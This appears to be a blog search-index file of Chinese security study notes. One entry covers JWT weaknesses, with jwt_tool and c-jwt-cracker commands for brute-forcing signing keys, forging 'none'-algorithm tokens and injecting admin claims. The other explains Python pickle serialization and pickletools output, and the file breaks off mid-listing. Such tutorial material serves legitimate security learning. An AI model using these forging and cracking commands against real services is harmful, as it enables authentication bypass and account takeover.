<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JWT</title>
    <link href="/2025/10/28/JWT/"/>
    <url>/2025/10/28/JWT/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li>JSON Web Token（<strong>JSON Web令牌</strong>）</li><li>是一种跨域验证身份的方案</li><li>JWT<strong>不加密传输</strong>的数据，但能通过<strong>数字签名来验证数据未被篡改</strong></li></ul><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p>1、用户端登录，用户名和密码在请求中被发往服务器<br>2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不 应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时， 服务器并没有保存登录状态信息。<br>3、服务器将 JWT（通过响应）返回给客户端<br>4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态6、服务器返回响应</p><h4 id="JWT与session区别："><a href="#JWT与session区别：" class="headerlink" title="JWT与session区别："></a>JWT与session区别：</h4><ul><li>两者的主要目的都是存储用户信息</li><li>但是session将用户信息存储再服务器端</li><li>而JWT则是在客户端。JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力</li></ul><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ul><li>头部（Header）<ul><li><code>alg</code>：说明这个JWT的签名<strong>使用的算法</strong>的参数，常见值用HS256（默认），HS512等，也可以为None。HS256 表示 HMAC SHA256。 </li><li><code>type</code>：说明这个 token 的类型，此例中为 JWT</li></ul></li><li>声明（Claims）</li><li>签名（Signature）</li><li>头部、声明、签名，三个部分以<code>.</code>隔开</li><li>JWT 的头部和声明以 Base64URL 进行了编码</li><li>不过签名在在加密前有一个密钥，与头部和声明都有关系<ul><li>没有签名可以更改头部内容，改为none，有些可以绕过，主要看对方是否检查签名</li></ul></li><li>在HTTP传输过程中，base64编码中的<code>=、,、+、/</code>等特殊符号通过url解码通常容易产生歧义，因此产生了与url编码兼容的base64url编码<ul><li><code>+</code>会变成<code>-</code>，<code>/</code>会变成<code>_</code>，<code>=</code>会被<strong>去掉</strong>，以此达到url safe的目的<br>![[20210504174333.png]]</li></ul></li></ul><h4 id="标准中注册的声明-建议但不强制使用-："><a href="#标准中注册的声明-建议但不强制使用-：" class="headerlink" title="标准中注册的声明 (建议但不强制使用) ："></a>标准中注册的声明 (建议但不强制使用) ：</h4><ul><li>iss: jwt签发者</li><li>sub: jwt所面向的用户</li><li>aud: 接收jwt的一方</li><li>exp: jwt的过期时间，这个过期时间必须要大于签发时间</li><li>nbf: 定义在什么时间之前，该jwt都是不可用的.</li><li>iat: jwt的签发时间</li><li>jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</li></ul><h4 id="Refresh-token"><a href="#Refresh-token" class="headerlink" title="Refresh token"></a>Refresh token</h4><ul><li>JWT使用refresh token去刷新access token而无需再次身份验证</li><li>refresh token的存活时间较长而access token的存活时间较短</li><li>服务器中可能存在：未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh token去刷新B用户的access token</li><li><a href="https://www.freebuf.com/vuls/216457.html">https://www.freebuf.com/vuls/216457.html</a></li></ul><h4 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h4><ul><li>无密钥：修改alg，删除签名（即对方不检查签名，未验证签名算法）</li><li>有密钥：对应修改数据后重新加密</li></ul><h3 id="在线解密平台"><a href="#在线解密平台" class="headerlink" title="在线解密平台"></a>在线解密平台</h3><p><a href="https://jwt.io/">https://jwt.io/</a></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li><strong>可在JWT的headers，payload部分的参数值中插入常见漏洞相关payload去尝试，尽管我们不知道signature key</strong>。</li></ul><h3 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h3><h4 id="c-jwt-cracker-jwt"><a href="#c-jwt-cracker-jwt" class="headerlink" title="c-jwt-cracker-jwt"></a>c-jwt-cracker-jwt</h4><ul><li><a href="https://github.com/brendan-rius/c-jwt-cracker">brendan-rius&#x2F;c-jwt-cracker: JWT brute force cracker written in C</a></li><li>该工具直接<em><strong>硬爆密钥</strong></em><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入目录里，然后：</span><br>docker build . -t jwtcrack<br><span class="hljs-comment">## 以后直接输入下列命令就行：</span><br>docker run -it --<span class="hljs-built_in">rm</span> jwtcrack JWT串<br></code></pre></td></tr></table></figure></li></ul><h4 id="jwt-tool"><a href="#jwt-tool" class="headerlink" title="jwt_tool"></a>jwt_tool</h4><ul><li><a href="https://github.com/ticarpi/jwt_tool">ticarpi&#x2F;jwt_tool: :snake: A toolkit for testing, tweaking and cracking JSON Web Tokens</a></li><li>该工具可以<em><strong>硬爆密钥</strong></em>，也可以<em><strong>根据字典爆密钥</strong></em>，也可以在得到密钥后进行<em><strong>伪造</strong></em><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解码获得信息</span><br>python jwt_tool.py JWT串<br><br><span class="hljs-comment"># 根据字典爆破</span><br>python jwt_tool.py JWT串 -C -d 字典.txt<br><span class="hljs-comment">## -C:对JWT进行压缩，以缩短字节长度</span><br><span class="hljs-comment">## -d:指定字典文件</span><br><span class="hljs-comment">## 成功展示：</span><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">Original JWT:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] admin123 is the CORRECT key!</span><br><span class="hljs-string">You can tamper/fuzz the token contents (-T/-I) and sign it using:</span><br><span class="hljs-string">python3 jwt_tool.py [options here] -S hs256 -p &quot;admin123&quot;</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">## 验证密钥</span><br>python jwt_tool.py JWT串 -C -p secret(密钥)<br><br><span class="hljs-comment"># 使用&quot;none&quot;算法创建未验证(即无签名)的令牌</span><br>python jwt_tool.py JWT串 -X a<br><span class="hljs-comment"># 使用密钥进行签名伪造</span><br>python jwt_tool.py JWT串 -I -pc user -pv admin -S hs256 -p <span class="hljs-string">&quot;admin123&quot;</span><br><span class="hljs-comment">## -pc:payloadclaim，键值中的键</span><br><span class="hljs-comment">## -pv:payloadvalue，键值中的值</span><br><span class="hljs-comment">## -S:选择签名算法</span><br><span class="hljs-comment">## -I:开启注入的claim的伪造</span><br><br><span class="hljs-comment"># 使用公钥验证令牌</span><br>python jwt_tool.py JWT串 -V -pk my_public.pem<br><span class="hljs-comment">## 或</span><br>python juw_tool.py JWT串 -V -jw my_public_jwks.json<br><br><span class="hljs-comment"># 交互式修改头部和负载声明</span><br></code></pre></td></tr></table></figure></li><li>options：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span><br>-b, --bare            <span class="hljs-built_in">return</span> TOKENS ONLY<br>-t TARGETURL, --targeturl TARGETURL<br>                        URL to send HTTP request to with new JWT<br>-r REQUEST, --request REQUEST<br>                        URL request to base on<br>-rt RATE, --rate RATE<br>                        Max. number of requests per minute<br>-i, --insecure        Use HTTP <span class="hljs-keyword">for</span> passed request<br>-rc COOKIES, --cookies COOKIES<br>                        request cookies to send with the forged HTTP request<br>-rh HEADERS, --headers HEADERS<br>                        request headers to send with the forged HTTP request (can be used multiple <span class="hljs-built_in">times</span> <span class="hljs-keyword">for</span> additional headers)<br>-pd POSTDATA, --postdata POSTDATA<br>                        text string that contains all the data to be sent <span class="hljs-keyword">in</span> a POST request<br>-cv CANARYVALUE, --canaryvalue CANARYVALUE<br>                        text string that appears <span class="hljs-keyword">in</span> response <span class="hljs-keyword">for</span> valid token (e.g. <span class="hljs-string">&quot;Welcome, ticarpi&quot;</span>)<br>-np, --noproxy        <span class="hljs-built_in">disable</span> proxy <span class="hljs-keyword">for</span> current request (change <span class="hljs-keyword">in</span> jwtconf.ini <span class="hljs-keyword">if</span> permanent)<br>-nr, --noredir        <span class="hljs-built_in">disable</span> redirects <span class="hljs-keyword">for</span> current request (change <span class="hljs-keyword">in</span> jwtconf.ini <span class="hljs-keyword">if</span> permanent)<br>-M MODE, --mode MODE  Scanning mode:<br>                        pb = playbook audit<br>                        er = fuzz existing claims to force errors<br>                        cc = fuzz common claims<br>                        at - All Tests!<br>-X EXPLOIT, --exploit EXPLOIT <span class="hljs-comment"># 利用</span><br>                        eXploit known vulnerabilities:<br>                        a = alg:none<br>                        n = null signature<br>                        b = blank password accepted <span class="hljs-keyword">in</span> signature<br>                        p = <span class="hljs-string">&#x27;psychic signature&#x27;</span> accepted <span class="hljs-keyword">in</span> ECDSA signing<br>                        s = spoof JWKS (specify JWKS URL with -ju, or <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> jwtconf.ini to automate this attack)<br>                        k = key confusion (specify public key with -pk)<br>                        i = inject inline JWKS<br>-ju JWKSURL, --jwksurl JWKSURL<br>                        URL location <span class="hljs-built_in">where</span> you can host a spoofed JWKS<br>-S SIGN, --sign SIGN  sign the resulting token:# 签名算法<br>                        hs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)<br>                        rs256/rs384/rs512 = RSA signing (specify an RSA private key with -<span class="hljs-built_in">pr</span>)<br>                        es256/es384/es512 = Elliptic Curve signing (specify an EC private key with -<span class="hljs-built_in">pr</span>)<br>                        ps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -<span class="hljs-built_in">pr</span>)<br>-<span class="hljs-built_in">pr</span> PRIVKEY, --privkey PRIVKEY<br>                        Private Key <span class="hljs-keyword">for</span> Asymmetric crypto<br>-T, --tamper          tamper with the JWT contents<br>                        (<span class="hljs-built_in">set</span> signing options with -S or use exploits with -X)<br>-I, --injectclaims    inject new claims and update existing claims with new values<br>                        (<span class="hljs-built_in">set</span> signing options with -S or use exploits with -X)<br>                        (<span class="hljs-built_in">set</span> target claim with -hc/-pc and injection values/lists with -hv/-pv<br>-hc HEADERCLAIM, --headerclaim HEADERCLAIM<br>                        Header claim to tamper with<br>-pc PAYLOADCLAIM, --payloadclaim PAYLOADCLAIM<br>                        Payload claim to tamper with<br>-hv HEADERVALUE, --headervalue HEADERVALUE<br>                        Value (or file containing values) to inject into tampered header claim<br>-pv PAYLOADVALUE, --payloadvalue PAYLOADVALUE<br>                        Value (or file containing values) to inject into tampered payload claim<br>-C, --crack           crack key <span class="hljs-keyword">for</span> an HMAC-SHA token <span class="hljs-comment"># 进行HMAC算法的密钥爆破</span><br>                        (specify -d/-p/-kf)<br>-d DICT, --dict DICT  dictionary file <span class="hljs-keyword">for</span> cracking <span class="hljs-comment"># 字典爆破</span><br>-p PASSWORD, --password PASSWORD<br>                        password <span class="hljs-keyword">for</span> cracking<br>-kf KEYFILE, --keyfile KEYFILE<br>                        keyfile <span class="hljs-keyword">for</span> cracking (when signed with <span class="hljs-string">&#x27;kid&#x27;</span> attacks)<br>-V, --verify          verify the RSA signature against a Public Key<br>                        (specify -pk/-jw)<br>-pk PUBKEY, --pubkey PUBKEY<br>                        Public Key <span class="hljs-keyword">for</span> Asymmetric crypto<br>-jw JWKSFILE, --jwksfile JWKSFILE<br>                        JSON Web Key Store <span class="hljs-keyword">for</span> Asymmetric crypto<br>-Q QUERY, --query QUERY<br>                        Query a token ID against the logfile to see the details of that request<br>                        e.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a<br>-v, --verbose         When parsing and printing, produce (slightly more) verbose output.<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>JWT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickle反序列化-1</title>
    <link href="/2025/10/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/"/>
    <url>/2025/10/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</url>
    
    <content type="html"><![CDATA[<p>整合1-2-4-5-6</p><h3 id="pickle库解析"><a href="#pickle库解析" class="headerlink" title="pickle库解析"></a>pickle库解析</h3><ul><li>这是Python的<em><strong>标准库</strong></em>，用于<strong>序列化</strong>和<strong>反序列化</strong>Python对象</li><li>在python中序列化是将Python对象转换为<em><strong>字节串</strong></em>（以字符串形式存在）的过程<ul><li>字符串是二进制的形式</li><li>这里的字节串其实就是<em><strong>opcode</strong></em>（<em><strong>操作码</strong></em>）</li></ul></li><li>读取和序列化储存的文件的后缀为<code>.pkl</code>，不能直接打开预览</li></ul><h4 id="方法与属性与协议"><a href="#方法与属性与协议" class="headerlink" title="方法与属性与协议"></a>方法与属性与协议</h4><table><thead><tr><th>特点</th><th>序列化</th><th>反序列化</th><th>作用</th></tr></thead><tbody><tr><td>针对文件</td><td>pickle.dump(obj,file)</td><td>pickle.load(file)</td><td>将对象序列化写入文件或从文件读取并反序列化对象</td></tr><tr><td>针对字节串</td><td>pickle.dumps(obj)</td><td>pickle.loads(bytes)</td><td>字节串&lt;–&gt;对象</td></tr><tr><td>-</td><td>-</td><td><strong>在反序列化一个实例时会自动引入没有引入的库</strong></td><td></td></tr></tbody></table><table><thead><tr><th>属性</th><th>作用</th></tr></thead><tbody><tr><td>pickle.HIGHEST_PROTOCOL</td><td>可用的最高协议版本</td></tr><tr><td>pickle.DEFAULT_PROTOCOL</td><td>默认协议版本（通常为4）</td></tr></tbody></table><table><thead><tr><th>协议版本</th><th>作用</th></tr></thead><tbody><tr><td>0</td><td>人类可读的ASCII格式（兼容旧版），并且向后兼容早期版本的 Python</td></tr><tr><td>1</td><td>二进制格式（兼容旧版），与早期版本的python兼容</td></tr><tr><td>2</td><td>Python 2.3+ 优化支持类对象，为存储 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307">PEP 307</a></td></tr><tr><td>3</td><td>Python 3.0+ 默认协议（不支持Python 2），具有对 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes">bytes</a> 对象的显式支持，且无法被 Python 2.x 打开</td></tr><tr><td>4</td><td>Python 3.4+ 支持更大对象和更多数据类型，包括一些针对数据格式的优化，参阅 <a href="https://www.python.org/dev/peps/pep-3154">PEP 3154</a></td></tr><tr><td>5</td><td>Python 3.8+ 支持内存优化和数据共享</td></tr><tr><td>-1&#x2F;None</td><td>使用默认的最高协议版本</td></tr></tbody></table><ul><li>在所有版本的协议中，0号版本是<em><strong>人类最可读</strong></em>的</li><li>使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新</li><li>由于pickle协议通常是<em><strong>向前兼容</strong></em>的，所以<em><strong>v0版本的字符串</strong></em>可以<em><strong>直接交给</strong></em><code>pickle.loads()</code>而不用担心引发意外</li></ul><h4 id="打包class"><a href="#打包class" class="headerlink" title="打包class"></a>打包class</h4><ul><li>需要注意的是，对于自定义<code>class</code>，不是对成员变量赋初值的话这个变量是不会被打包的</li><li>需要用<code>__init__</code>构造方法转换<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">dairy</span>():<br>date = <span class="hljs-number">20241004</span><br><span class="hljs-comment"># 这样的话date是不会被打包的</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">dairy</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-variable language_">self</span>.date = <span class="hljs-number">20241004</span><br><span class="hljs-comment"># 这样就能被打包了</span><br>d = dairy()<br><span class="hljs-built_in">print</span>(pickle.dumps(d))<br></code></pre></td></tr></table></figure></li></ul><h3 id="pickle反序列化函数利用过程解析"><a href="#pickle反序列化函数利用过程解析" class="headerlink" title="pickle反序列化函数利用过程解析"></a>pickle反序列化函数利用过程解析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 进入pickle类看load和loads</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_load</span>(<span class="hljs-params">file, *, fix_imports=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">&quot;ASCII&quot;</span>, errors=<span class="hljs-string">&quot;strict&quot;</span>,</span><br><span class="hljs-params">          buffers=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> _Unpickler(file, fix_imports=fix_imports, buffers=buffers,<br>                     encoding=encoding, errors=errors).load()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_loads</span>(<span class="hljs-params">s, /, *, fix_imports=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">&quot;ASCII&quot;</span>, errors=<span class="hljs-string">&quot;strict&quot;</span>,</span><br><span class="hljs-params">           buffers=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)<br>    file = io.BytesIO(s)<br>    <span class="hljs-keyword">return</span> _Unpickler(file, fix_imports=fix_imports, buffers=buffers,<br>                      encoding=encoding, errors=errors).load()<br></code></pre></td></tr></table></figure><ul><li>可以看出这两个函数其实没什么区别，都是把输入转化为<em><strong>文件流</strong></em>，传给<code>_Unpickler</code>类后调用该类的<code>load()</code>函数</li><li>研究该类的工具：<code>pickletools</code></li></ul><h4 id="pickletools库"><a href="#pickletools库" class="headerlink" title="pickletools库"></a>pickletools库</h4><ul><li><em><strong>pickletools</strong></em>是pythonn自带的<strong>pickle调试器</strong></li><li>能<em><strong>反汇编</strong></em>一个已经被打包的字符串</li><li>能<em><strong>优化</strong></em>一个<strong>已经被打包</strong>的字符串你</li><li>能返回一个迭代器来供程序使用</li><li>借用这个工具能方便的看清楚每条语句的作用，并检测手动构造的字符串<strong>是否合法</strong></li><li></li></ul><h5 id="反汇编功能"><a href="#反汇编功能" class="headerlink" title="反汇编功能"></a>反汇编功能</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">dairy</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-variable language_">self</span>.date = <span class="hljs-number">114514</span><br><span class="hljs-variable language_">self</span>.text = <span class="hljs-string">&quot;无聊的一天&quot;</span><br><span class="hljs-variable language_">self</span>.todo = [<span class="hljs-string">&quot;分析pickle&quot;</span>,<span class="hljs-string">&quot;吃零食&quot;</span>]<br>x = dairy()<br>s = pickle.dumps(x)<br><span class="hljs-built_in">print</span>(s)<br>pickletools.dis(s)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;\x80\x04\x95i\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05dairy\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04date\x94JR\xbf\x01\x00\x8c\x04text\x94\x8c\x0f\xe6\x97\xa0\xe8\x81\x8a\xe7\x9a\x84\xe4\xb8\x80\xe5\xa4\xa9\x94\x8c\x04todo\x94]\x94(\x8c\x0c\xe5\x88\x86\xe6\x9e\x90pickle\x94\x8c\t\xe5\x90\x83\xe9\x9b\xb6\xe9\xa3\x9f\x94eub.&#x27;</span><br><span class="hljs-string">    0: \x80 PROTO      4</span><br><span class="hljs-string">    2: \x95 FRAME      105</span><br><span class="hljs-string">   11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="hljs-string">   21: \x94 MEMOIZE    (as 0)</span><br><span class="hljs-string">   22: \x8c SHORT_BINUNICODE &#x27;dairy&#x27;</span><br><span class="hljs-string">   29: \x94 MEMOIZE    (as 1)</span><br><span class="hljs-string">   30: \x93 STACK_GLOBAL</span><br><span class="hljs-string">   31: \x94 MEMOIZE    (as 2)</span><br><span class="hljs-string">   32: )    EMPTY_TUPLE</span><br><span class="hljs-string">   33: \x81 NEWOBJ</span><br><span class="hljs-string">   34: \x94 MEMOIZE    (as 3)</span><br><span class="hljs-string">   35: &#125;    EMPTY_DICT</span><br><span class="hljs-string">   36: \x94 MEMOIZE    (as 4)</span><br><span class="hljs-string">   37: (    MARK</span><br><span class="hljs-string">   38: \x8c     SHORT_BINUNICODE &#x27;date&#x27;</span><br><span class="hljs-string">   44: \x94     MEMOIZE    (as 5)</span><br><span class="hljs-string">   45: J        BININT     114514</span><br><span class="hljs-string">   50: \x8c     SHORT_BINUNICODE &#x27;text&#x27;</span><br><span class="hljs-string">   56: \x94     MEMOIZE    (as 6)</span><br><span class="hljs-string">   57: \x8c     SHORT_BINUNICODE &#x27;无聊的一天&#x27;</span><br><span class="hljs-string">   74: \x94     MEMOIZE    (as 7)</span><br><span class="hljs-string">   75: \x8c     SHORT_BINUNICODE &#x27;todo&#x27;</span><br><span class="hljs-string">   81: \x94     MEMOIZE    (as 8)</span><br><span class="hljs-string">   82: ]        EMPTY_LIST</span><br><span class="hljs-string">   83: \x94     MEMOIZE    (as 9)</span><br><span class="hljs-string">   84: (        MARK</span><br><span class="hljs-string">   85: \x8c         SHORT_BINUNICODE &#x27;分析pickle&#x27;</span><br><span class="hljs-string">   99: \x94         MEMOIZE    (as 10)</span><br><span class="hljs-string">  100: \x8c         SHORT_BINUNICODE &#x27;吃零食&#x27;</span><br><span class="hljs-string">  111: \x94         MEMOIZE    (as 11)</span><br><span class="hljs-string">  112: e            APPENDS    (MARK at 84)</span><br><span class="hljs-string">  113: u        SETITEMS   (MARK at 37)</span><br><span class="hljs-string">  114: b    BUILD</span><br><span class="hljs-string">  115: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 4</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>解析序列化后的字符串，并说明这个字符串都干了什么</li><li><em><strong>每一行都是一条指令</strong></em></li></ul><h5 id="优化功能"><a href="#优化功能" class="headerlink" title="优化功能"></a>优化功能</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">dairy</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-variable language_">self</span>.date = <span class="hljs-number">114514</span><br><span class="hljs-variable language_">self</span>.text = <span class="hljs-string">&quot;无聊的一天&quot;</span><br><span class="hljs-variable language_">self</span>.todo = [<span class="hljs-string">&quot;分析pickle&quot;</span>,<span class="hljs-string">&quot;吃零食&quot;</span>]<br>x = dairy()<br>s = pickle.dumps(x)<br>s = pickletools.optimize(s)<br><span class="hljs-built_in">print</span>(s)<br>pickletools.dis(s)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;\x80\x04\x95]\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x05dairy\x93)\x81&#125;(\x8c\x04dateJR\xbf\x01\x00\x8c\x04text\x8c\x0f\xe6\x97\xa0\xe8\x81\x8a\xe7\x9a\x84\xe4\xb8\x80\xe5\xa4\xa9\x8c\x04todo](\x8c\x0c\xe5\x88\x86\xe6\x9e\x90pickle\x8c\t\xe5\x90\x83\xe9\x9b\xb6\xe9\xa3\x9feub.&#x27;</span><br><span class="hljs-string">    0: \x80 PROTO      4</span><br><span class="hljs-string">    2: \x95 FRAME      93</span><br><span class="hljs-string">   11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="hljs-string">   21: \x8c SHORT_BINUNICODE &#x27;dairy&#x27;</span><br><span class="hljs-string">   28: \x93 STACK_GLOBAL</span><br><span class="hljs-string">   29: )    EMPTY_TUPLE</span><br><span class="hljs-string">   30: \x81 NEWOBJ</span><br><span class="hljs-string">   31: &#125;    EMPTY_DICT</span><br><span class="hljs-string">   32: (    MARK</span><br><span class="hljs-string">   33: \x8c     SHORT_BINUNICODE &#x27;date&#x27;</span><br><span class="hljs-string">   39: J        BININT     114514</span><br><span class="hljs-string">   44: \x8c     SHORT_BINUNICODE &#x27;text&#x27;</span><br><span class="hljs-string">   50: \x8c     SHORT_BINUNICODE &#x27;无聊的一天&#x27;</span><br><span class="hljs-string">   67: \x8c     